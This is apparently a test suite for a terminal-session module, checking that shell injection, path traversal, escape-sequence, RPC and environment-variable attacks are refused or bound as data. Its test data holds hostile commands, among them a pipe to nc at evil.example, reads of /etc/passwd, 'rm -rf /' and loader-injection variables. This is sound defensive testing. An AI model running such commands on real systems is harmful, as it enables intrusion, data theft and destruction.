/**
 * T13 unsafe-input-boundaries suite (plan T13 Attack 1, REQ-SEC-005, DSN-014).
 *
 * Declared falsifier: "Inject shell metacharacters/path traversal through an
 * untrusted terminal/process parameter that should be treated as data."
 * Expected: the privileged boundary rejects or safely binds it; no unintended
 * command/path executes.
 *
 * Structure:
 *   - the injection matrix drives argv/path/env/automation/RPC parameters
 *     through validateSpawnRequest / bindTerminalAutomation /
 *     validateRpcPayload and asserts typed refusals or inert bindings;
 *   - a NEGATIVE CONTROL live-fires the forbidden shape (joined shell string)
 *     to prove the attack is real on this platform, then proves the module's
 *     bound path executes nothing extra;
 *   - two REAL child-process probes (T03-qualified Bun.spawn) demonstrate
 *     binding-as-data with a genuine process, deterministically.
 */

import { describe, expect, it } from "bun:test";
import { chmodSync, existsSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  type BoundaryLocus,
  type BoundaryRejectionCode,
  bindTerminalAutomation,
  bunPipeProcessProvider,
  FakeProcessProvider,
  sanitizeTerminalOutput,
  TerminalBoundaryError,
  TerminalSession,
  type ValidatedSpawnRequest,
  validateRpcPayload,
  validateSpawnRequest,
} from "./terminal-session";

const POLICY = {
  allowedProgramRoots: ["/bin", "/usr/bin"],
  allowedPathRoots: ["/tmp/gauntlet-t13"],
} as const;

const ATTACK_FILE = join(tmpdir(), "gauntlet-t13-attack1-marker");

async function until(predicate: () => boolean, timeoutMs = 5000): Promise<void> {
  const deadline = performance.now() + timeoutMs;
  while (!predicate()) {
    if (performance.now() > deadline) {
      throw new Error("until(): predicate never became true");
    }
    await Bun.sleep(2);
  }
}

function expectBoundary(
  locus: BoundaryLocus,
  code: BoundaryRejectionCode,
  run: () => unknown,
): void {
  let raised: unknown = null;
  try {
    run();
  } catch (error) {
    raised = error;
  }
  expect(raised).toBeInstanceOf(TerminalBoundaryError);
  const boundary = raised as TerminalBoundaryError;
  expect(boundary.locus).toBe(locus);
  expect(boundary.code).toBe(code);
}

describe("T13 Attack 1 matrix: shell metacharacters in the program parameter", () => {
  const injections = [
    ["semicolon chain", "echo x; touch /tmp/pwned"],
    ["pipe", "echo x | nc evil.example 4444"],
    ["command substitution", "$(touch /tmp/pwned)"],
    ["backtick substitution", "`touch /tmp/pwned`"],
    ["AND chain", "true && touch /tmp/pwned"],
    ["redirection", "passwd > /etc/shadow"],
    ["newline chaining", "true\ntouch /tmp/pwned"],
  ] as const;

  for (const [name, injected] of injections) {
    it(`refuses ${name} in the program (typed argv rejection, nothing spawns)`, () => {
      const provider = new FakeProcessProvider();
      expectBoundary("argv", "shell_metacharacter_in_program", () => {
        new TerminalSession({ program: injected, cwd: "/tmp/gauntlet-t13" }, provider, {
          pathPolicy: POLICY,
        });
      });
      // The refusal happens BEFORE any process could exist.
      expect(provider.spawnCount).toBe(0);
    });
  }

  it("refuses glob/metachar program shapes and empty programs", () => {
    expectBoundary("argv", "shell_metacharacter_in_program", () =>
      validateSpawnRequest({ program: "/bin/sh*", cwd: "/tmp/gauntlet-t13" }, POLICY),
    );
    expectBoundary("argv", "empty_program", () =>
      validateSpawnRequest({ program: "", cwd: "/tmp/gauntlet-t13" }, POLICY),
    );
  });

  it("refuses relative program paths (anchoring is mandatory)", () => {
    expectBoundary("argv", "relative_program_path", () =>
      validateSpawnRequest({ program: "sub/ls", cwd: "/tmp/gauntlet-t13" }, POLICY),
    );
  });

  it("refuses bare programs missing from the declared resolution table", () => {
    expectBoundary("argv", "program_not_in_allowlist", () =>
      validateSpawnRequest(
        { program: "curl", cwd: "/tmp/gauntlet-t13" },
        { ...POLICY, programResolution: { sh: "/bin/sh", ls: "/bin/ls" } },
      ),
    );
    // In-table bare names bind to their RESOLVED anchored absolute path —
    // the provider never receives the bare name (T18 correction, shape 2).
    const bound = validateSpawnRequest(
      { program: "ls", cwd: "/tmp/gauntlet-t13" },
      { ...POLICY, programResolution: { sh: "/bin/sh", ls: "/bin/ls" } },
    );
    expect(bound.program).toBe("/bin/ls");
  });
});

describe("T13 Attack 1 matrix: path traversal in path parameters", () => {
  it("refuses cwd traversal that escapes the anchored roots", () => {
    expectBoundary("path", "path_traversal", () =>
      validateSpawnRequest({ program: "/bin/ls", cwd: "/tmp/gauntlet-t13/../../.." }, POLICY),
    );
    expectBoundary("path", "path_traversal", () =>
      validateSpawnRequest({ program: "/bin/ls", cwd: "/../../etc" }, POLICY),
    );
  });

  it("refuses relative cwds and cwds outside the roots", () => {
    expectBoundary("path", "path_not_absolute", () =>
      validateSpawnRequest({ program: "/bin/ls", cwd: "../../etc/passwd" }, POLICY),
    );
    expectBoundary("path", "path_outside_allowed_roots", () =>
      validateSpawnRequest({ program: "/bin/ls", cwd: "/etc" }, POLICY),
    );
    expectBoundary("path", "path_outside_allowed_roots", () =>
      validateSpawnRequest({ program: "/bin/ls", cwd: "/tmp/gauntlet-t13-evil" }, POLICY),
    );
  });

  it("refuses NUL-byte path smuggling in cwd and program", () => {
    expectBoundary("path", "path_traversal", () =>
      validateSpawnRequest({ program: "/bin/ls", cwd: "/tmp/gauntlet-t13\u0000/../../" }, POLICY),
    );
    // NUL in the program hits the metacharacter wall first (argv locus).
    expectBoundary("argv", "shell_metacharacter_in_program", () =>
      validateSpawnRequest({ program: "/bin/ls\u0000", cwd: "/tmp/gauntlet-t13" }, POLICY),
    );
  });

  it("anchoring NORMALIZES benign dot segments instead of rejecting them", () => {
    const bound = validateSpawnRequest(
      { program: "/bin/./ls", cwd: "/tmp/gauntlet-t13/./sub/.." },
      POLICY,
    );
    expect(bound.program).toBe("/bin/ls");
    expect(bound.cwd).toBe("/tmp/gauntlet-t13");
  });

  it("refuses program paths that resolve outside the program roots", () => {
    expectBoundary("path", "path_outside_allowed_roots", () =>
      validateSpawnRequest(
        { program: "/bin/../usr/local/bin/evil", cwd: "/tmp/gauntlet-t13" },
        POLICY,
      ),
    );
    expectBoundary("path", "path_outside_allowed_roots", () =>
      validateSpawnRequest({ program: "/etc/passwd", cwd: "/tmp/gauntlet-t13" }, POLICY),
    );
  });
});

describe("T13 Attack 1: argv metacharacters are BOUND AS DATA, never a shell string", () => {
  const injectionArgs = [
    "; touch /tmp/gauntlet-t13-attack1",
    "$(touch /tmp/gauntlet-t13-attack1)",
    "`touch /tmp/gauntlet-t13-attack1`",
    "| cat /etc/passwd",
  ];

  it("binds every metacharacter argument as a separate argv element", () => {
    const bound: ValidatedSpawnRequest = validateSpawnRequest(
      { program: "/bin/echo", args: injectionArgs, cwd: "/tmp/gauntlet-t13" },
      POLICY,
    );
    // Bound — present as DATA elements…
    expect(bound.args).toEqual(injectionArgs);
    // …never joined into an interpretable command line.
    expect(bound.args).toHaveLength(4);
    expect(JSON.stringify(bound)).not.toContain('"/bin/echo ; touch');
    expect(JSON.stringify(bound)).not.toContain("/bin/sh");
    expect(bound.cwd).toBe("/tmp/gauntlet-t13");
  });

  it("control bytes in argv are refused even as data (C0/DEL)", () => {
    expectBoundary("argv", "control_char_in_argv", () =>
      validateSpawnRequest(
        { program: "/bin/echo", args: ["safe\u0007bell"], cwd: "/tmp/gauntlet-t13" },
        POLICY,
      ),
    );
    expectBoundary("argv", "control_char_in_argv", () =>
      validateSpawnRequest(
        { program: "/bin/echo", args: ["x\u001b]52;c;base64\u0007y"], cwd: "/tmp/gauntlet-t13" },
        POLICY,
      ),
    );
  });

  it("REAL process: the bound argv executes echo only — no marker file, exit 0", async () => {
    mkdirSync("/tmp/gauntlet-t13", { recursive: true });
    rmSync(ATTACK_FILE, { force: true });

    const provider = bunPipeProcessProvider();
    const session = new TerminalSession(
      {
        program: "/bin/echo",
        args: injectionArgs,
        cwd: "/tmp/gauntlet-t13",
      },
      provider,
      { pathPolicy: POLICY },
    );
    await until(() => session.status === "exited", 10000);

    expect(session.status).toBe("exited");
    expect(session.provenance.exitCode).toBe(0);
    // The injection arrived as echo's DATA (visible in the sanitized projection)…
    const joined = session.project().scrollback.join("\n");
    expect(joined).toContain("; touch /tmp/gauntlet-t13-attack1");
    expect(joined).toContain("$(touch /tmp/gauntlet-t13-attack1)");
    // …and NO interpreter ever consumed it.
    expect(existsSync(ATTACK_FILE)).toBe(false);
  });
});

describe("T13 negative control: the validator has teeth", () => {
  it("live-fires the forbidden shell-string shape to prove the attack is real", async () => {
    rmSync(ATTACK_FILE, { force: true });
    // THE FORBIDDEN SHAPE — what REQ-SEC-005 forbids: untrusted content
    // interpolated into a shell string. On this platform it REALLY executes
    // the injected command, which is exactly what the boundary must prevent.
    const program = "/bin/echo";
    const untrustedArg = `benign; touch ${ATTACK_FILE}`;
    const joined = `${program} ${untrustedArg}`;
    const rogue = Bun.spawn(["/bin/sh", "-c", joined], { stdout: "pipe", stderr: "pipe" });
    const rogueCode = await rogue.exited;
    expect(rogueCode).toBe(0);
    expect(existsSync(ATTACK_FILE)).toBe(true); // interpolation DID execute it
    rmSync(ATTACK_FILE, { force: true });
  });

  it("the same untrusted content through the module binds inert and executes nothing extra", async () => {
    const untrustedArg = `benign; touch ${ATTACK_FILE}`;
    const bound = validateSpawnRequest(
      { program: "/bin/echo", args: [untrustedArg], cwd: "/tmp/gauntlet-t13" },
      POLICY,
    );
    expect(bound.args).toEqual([untrustedArg]); // data, intact, separate

    const provider = bunPipeProcessProvider();
    const session = new TerminalSession(
      { program: "/bin/echo", args: [untrustedArg], cwd: "/tmp/gauntlet-t13" },
      provider,
      { pathPolicy: POLICY },
    );
    await until(() => session.status === "exited", 10000);
    expect(existsSync(ATTACK_FILE)).toBe(false); // the boundary held
  });

  it("a validator mutation is caught: the refusal list is load-bearing", () => {
    // Direct probe of the rejection path — if PROGRAM_METACHARACTERS lost a
    // character, this assertion fails. (Mutation-style tooth.)
    for (const metacharacter of [";", "|", "&", "$", "`", ">", "<", "(", ")"]) {
      let raised: unknown = null;
      try {
        validateSpawnRequest(
          { program: `/bin/echo${metacharacter}`, cwd: "/tmp/gauntlet-t13" },
          POLICY,
        );
      } catch (error) {
        raised = error;
      }
      expect(raised).toBeInstanceOf(TerminalBoundaryError);
    }
  });
});

describe("T13 Attack 1 matrix: ANSI/OSC injection through untrusted parameters", () => {
  it("binds an OSC 52 clipboard request and OSC 8 hyperlink in a title as inert text", () => {
    const hostile =
      "\x1b]0;pwned-title\x07\x1b]52;c;U0VjcmV0\x07\x1b]8;;http://evil.example\x07click\x1b]8;;\x07";
    const bound = validateSpawnRequest(
      { program: "/bin/sh", cwd: "/tmp/gauntlet-t13", title: hostile },
      POLICY,
    );
    expect(bound.title).not.toBeNull();
    expect(bound.title).not.toContain("\x1b");
    expect(bound.title).not.toContain("U0VjcmV0");
    expect(bound.title).not.toContain("http://evil.example");
    // The raw request is never handed onward — only the bound shape.
    expect(JSON.stringify(bound)).not.toContain("U0VjcmV0");
  });

  it("binds terminal automation titles through the same boundary", () => {
    const applied = bindTerminalAutomation({
      kind: "title",
      value: "build \x1b]52;c;QQ==\x07\x1b[31mred\x1b[0m",
    });
    expect(applied.value).toBe("build red");
    expect(applied.neutralized.oscClipboard).toBe(1);
    expect(applied.neutralized.csi).toBe(2);
    expect(applied.value?.includes("\x1b")).toBe(false);
  });

  it("sanitizer caret mode keeps the forensic text without control functions", () => {
    const caret = sanitizeTerminalOutput("\x1b]52;c;QQ==\x07", { mode: "caret" });
    expect(caret.text).toBe("^[]52;c;QQ==^G");
    expect(caret.neutralized.oscClipboard).toBe(1);
  });

  it("untrusted child OUTPUT carrying OSC 52 cannot reach the projection", () => {
    const provider = new FakeProcessProvider();
    const session = new TerminalSession(
      { program: "/bin/sh", cwd: "/tmp/gauntlet-t13" },
      provider,
      { pathPolicy: POLICY },
    );
    provider.runScript([
      { emit: "\x1b]52;c;Q0xJUEJPQVJE\x07\x1b]8;;file:///etc/passwd\x07x\x1b]8;;\x07done" },
    ]);
    const projected = session.project();
    const joined = projected.scrollback.join("\n");
    expect(joined).toBe("xdone");
    expect(projected.neutralized.oscClipboard).toBe(1);
    expect(projected.neutralized.oscHyperlink).toBe(2);
    expect(joined.includes("\x1b")).toBe(false);
  });
});

describe("T13 Attack 1 matrix: RPC payload and env boundaries", () => {
  it("refuses non-allowlisted RPC keys and non-string values (typed)", () => {
    expectBoundary("rpc-payload", "payload_key_not_allowed", () =>
      validateRpcPayload({ title: "ok", cmd: "rm -rf /" }, { allowedKeys: ["title"] }),
    );
    expectBoundary("rpc-payload", "payload_value_not_string", () =>
      validateRpcPayload({ title: 42 }, { allowedKeys: ["title"] }),
    );
    expectBoundary("rpc-payload", "payload_not_object", () =>
      validateRpcPayload(["rm", "-rf", "/"], { allowedKeys: ["title"] }),
    );
    expectBoundary("rpc-payload", "payload_too_large", () =>
      validateRpcPayload(
        { title: "x".repeat(5000) },
        { allowedKeys: ["title"], maxValueBytes: 64 },
      ),
    );
  });

  it("binds an OSC-carrying RPC title inert at the boundary", () => {
    const bound = validateRpcPayload(
      { title: "\x1b]52;c;U1RBUlQ=\x07inbox \x1b[33mwarn" },
      { allowedKeys: ["title"] },
    );
    expect(bound.values["title"]).toBe("inbox warn");
    expect(bound.neutralized.oscClipboard).toBe(1);
    expect(bound.neutralized.csi).toBe(1);
  });

  it("refuses env smuggling: control bytes and malformed names", () => {
    expectBoundary("env", "env_value_control_char", () =>
      validateSpawnRequest(
        { program: "/bin/sh", cwd: "/tmp/gauntlet-t13", env: { HOME: "x\ny" } },
        POLICY,
      ),
    );
    // LD_PRELOAD hits the loader-injection family refusal first (correction
    // round 1) — asserted exhaustively in the T18 describe above.
    expectBoundary("env", "env_name_invalid", () =>
      validateSpawnRequest(
        { program: "/bin/sh", cwd: "/tmp/gauntlet-t13", env: { "BAD NAME": "1" } },
        POLICY,
      ),
    );
    expectBoundary("env", "env_name_invalid", () =>
      validateSpawnRequest(
        { program: "/bin/sh", cwd: "/tmp/gauntlet-t13", env: { "-LD_PRELOAD": "1" } },
        POLICY,
      ),
    );
  });

  it("provenance records env NAMES only — values never reach the projection", () => {
    const provider = new FakeProcessProvider();
    const session = new TerminalSession(
      {
        program: "/bin/sh",
        cwd: "/tmp/gauntlet-t13",
        env: { T13_SECRET_TOKEN: "super-secret-value-xyz" },
      },
      provider,
      { pathPolicy: POLICY },
    );
    const everything = JSON.stringify(session.project()) + JSON.stringify(session.events);
    expect(everything).toContain("T13_SECRET_TOKEN");
    expect(everything).not.toContain("super-secret-value-xyz");
  });
});

// --- Correction round 1 (T18 adversarial MAJOR: spawn-env executable substitution)
// Verifier finding: `{program: "echo" (allowlisted bare name), env:{PATH: fakebin}}`
// was accepted, forwarded verbatim into Bun.spawn, and the SUBSTITUTED binary
// executed. Fix shape (1): refuse PATH / LD_* / DYLD_* outright and any env
// value carrying a path separator. Fix shape (2): bare names resolve to
// anchored ABSOLUTE paths before spawn — no child-side PATH lookup can happen.

const FAKEBIN = join(tmpdir(), "gauntlet-t13-fakebin");
const RESOLUTION: Record<string, string> = { echo: "/bin/echo", ls: "/bin/ls", sh: "/bin/sh" };

describe("T13 correction round 1 (T18 MAJOR): spawn-env executable substitution", () => {
  it("END-TO-END through the REAL provider: attacker PATH cannot substitute the binary", async () => {
    mkdirSync(FAKEBIN, { recursive: true });
    // The attacker's substituted `echo`: only THIS binary writes the marker;
    // /bin/echo cannot. Mirrors the verifier's demonstration. (/bin/touch is
    // absolute ON PURPOSE: the attacker PATH contains only fakebin, so a bare
    // `touch` inside the script would itself fail — the marker must be
    // attributable to the SUBSTITUTED binary alone.)
    writeFileSync(join(FAKEBIN, "echo"), `#!/bin/sh\n/bin/touch ${ATTACK_FILE}\n`);
    chmodSync(join(FAKEBIN, "echo"), 0o755);
    rmSync(ATTACK_FILE, { force: true });

    // Negative control — the vector is REAL: Bun.spawn resolves a bare name
    // through the CHILD env's PATH.
    const rogue = Bun.spawn(["echo", "pwned"], {
      env: { PATH: FAKEBIN },
      stdout: "pipe",
      stderr: "pipe",
    });
    await rogue.exited;
    expect(existsSync(ATTACK_FILE)).toBe(true); // substitution DID execute here
    rmSync(ATTACK_FILE, { force: true });

    // The same shape through the module's REAL-provider path: refused at the
    // boundary, before any provider call, so the substituted binary never runs.
    expectBoundary("env", "env_path_override", () => {
      new TerminalSession(
        {
          program: "echo",
          args: ["pwned"],
          cwd: "/tmp/gauntlet-t13",
          env: { PATH: FAKEBIN },
        },
        bunPipeProcessProvider(),
        { pathPolicy: { ...POLICY, programResolution: RESOLUTION } },
      );
    });
    expect(existsSync(ATTACK_FILE)).toBe(false);

    // spawn-never-happened is directly observable on the fake provider too.
    const fake = new FakeProcessProvider();
    expectBoundary("env", "env_path_override", () => {
      new TerminalSession(
        { program: "echo", env: { PATH: FAKEBIN }, cwd: "/tmp/gauntlet-t13" },
        fake,
        { pathPolicy: { ...POLICY, programResolution: RESOLUTION } },
      );
    });
    expect(fake.spawnCount).toBe(0);

    rmSync(FAKEBIN, { recursive: true, force: true });
  });

  it("refuses the dynamic-loader injection families outright (LD_*, DYLD_*)", () => {
    const policy = { ...POLICY, programResolution: RESOLUTION };
    for (const name of [
      "LD_PRELOAD",
      "LD_LIBRARY_PATH",
      "LD_AUDIT",
      "DYLD_INSERT_LIBRARIES",
      "DYLD_LIBRARY_PATH",
      "DYLD_FRAMEWORK_PATH",
    ]) {
      expectBoundary("env", "env_loader_injection_family", () =>
        validateSpawnRequest(
          { program: "sh", cwd: "/tmp/gauntlet-t13", env: { [name]: "/tmp/attacker/evil.so" } },
          policy,
        ),
      );
    }
  });

  it("refuses path-separator-bearing env values (PYTHONPATH/NODE_PATH class)", () => {
    const policy = { ...POLICY, programResolution: RESOLUTION };
    for (const [name, value] of [
      ["PYTHONPATH", "/tmp/attacker"],
      ["NODE_PATH", "/tmp/attacker/node_modules"],
      ["HOME", "/tmp/attacker/home"],
      ["WEIRD", "a/b"],
    ] as const) {
      expectBoundary("env", "env_value_path_separator", () =>
        validateSpawnRequest(
          { program: "sh", cwd: "/tmp/gauntlet-t13", env: { [name]: value } },
          policy,
        ),
      );
    }
  });

  it("refuses a bare program name when no resolution table is declared", () => {
    expectBoundary("argv", "bare_program_unresolved", () =>
      validateSpawnRequest({ program: "curl", cwd: "/tmp/gauntlet-t13" }, POLICY),
    );
  });

  it("resolves bare names through the declared table to anchored absolute paths", () => {
    const bound = validateSpawnRequest(
      { program: "echo", cwd: "/tmp/gauntlet-t13" },
      { ...POLICY, programResolution: RESOLUTION },
    );
    // Absolute BEFORE spawn — no child-side PATH lookup can ever select.
    expect(bound.program).toBe("/bin/echo");
  });

  it("refuses a resolution table entry outside the program roots", () => {
    expectBoundary("path", "path_outside_allowed_roots", () =>
      validateSpawnRequest(
        { program: "evil", cwd: "/tmp/gauntlet-t13" },
        { ...POLICY, programResolution: { evil: "/tmp/attacker/evil" } },
      ),
    );
  });

  it("REAL provider: resolved argv[0] is the anchored absolute path; requested name kept", async () => {
    mkdirSync("/tmp/gauntlet-t13", { recursive: true });
    mkdirSync(FAKEBIN, { recursive: true });
    writeFileSync(join(FAKEBIN, "echo"), `#!/bin/sh\ntouch ${ATTACK_FILE}\n`);
    chmodSync(join(FAKEBIN, "echo"), 0o755);
    rmSync(ATTACK_FILE, { force: true });

    const provider = bunPipeProcessProvider();
    const session = new TerminalSession(
      { program: "echo", args: ["resolved"], cwd: "/tmp/gauntlet-t13" },
      provider,
      { pathPolicy: { ...POLICY, programResolution: RESOLUTION } },
    );
    expect(session.provenance.argv[0]).toBe("/bin/echo");
    expect(session.provenance.requestedProgram).toBe("echo");
    await until(() => session.status === "exited", 10000);
    expect(session.provenance.exitCode).toBe(0);
    // /bin/echo ran — not the attacker's fakebin substitute.
    expect(existsSync(ATTACK_FILE)).toBe(false);

    rmSync(FAKEBIN, { recursive: true, force: true });
  });

  it("control bytes (ESC/DEL) in program and path parameters are refused", () => {
    // Adjacent hole closed with the same round: an ESC in program/cwd would
    // ride provenance into non-viewport projections (DSN-014).
    expectBoundary("argv", "shell_metacharacter_in_program", () =>
      validateSpawnRequest(
        { program: "/bin/ls\x1b]52;c;QQ==\x07", cwd: "/tmp/gauntlet-t13" },
        POLICY,
      ),
    );
    expectBoundary("path", "control_char_in_path", () =>
      validateSpawnRequest(
        { program: "/bin/ls", cwd: "/tmp/gauntlet-t13/\x1b]52;c;QQ==\x07" },
        POLICY,
      ),
    );
  });
});

describe("T13 pinned (T18): cwd edge shapes the verifier found sound, pinned", () => {
  it("percent-encoded traversal stays a literal segment inside the roots", () => {
    const bound = validateSpawnRequest(
      { program: "/bin/ls", cwd: "/tmp/gauntlet-t13/%2e%2e%2fetc" },
      POLICY,
    );
    // No component in the chain URL-decodes: the segment is an inert name.
    expect(bound.cwd).toBe("/tmp/gauntlet-t13/%2e%2e%2fetc");
  });

  it("double-encoded traversal stays literal", () => {
    const bound = validateSpawnRequest(
      { program: "/bin/ls", cwd: "/tmp/gauntlet-t13/%252e%252e%252f" },
      POLICY,
    );
    expect(bound.cwd).toBe("/tmp/gauntlet-t13/%252e%252e%252f");
  });

  it("encoded NUL stays literal; a raw NUL byte is refused", () => {
    const bound = validateSpawnRequest(
      { program: "/bin/ls", cwd: "/tmp/gauntlet-t13/a%00b" },
      POLICY,
    );
    expect(bound.cwd).toBe("/tmp/gauntlet-t13/a%00b");
    expectBoundary("path", "path_traversal", () =>
      validateSpawnRequest({ program: "/bin/ls", cwd: "/tmp/gauntlet-t13\u0000b" }, POLICY),
    );
  });

  it("shell metacharacters and spaces in cwd are literal (nothing re-parses a path)", () => {
    const hostile = "/tmp/gauntlet-t13/ok && touch /tmp/pwned-cwd; cat /etc/passwd";
    const bound = validateSpawnRequest({ program: "/bin/ls", cwd: hostile }, POLICY);
    // Bound verbatim: chdir(2) takes it as one literal directory NAME.
    expect(bound.cwd).toBe(hostile);
    const spaced = "/tmp/gauntlet-t13/dir with spaces";
    expect(validateSpawnRequest({ program: "/bin/ls", cwd: spaced }, POLICY).cwd).toBe(spaced);
  });
});
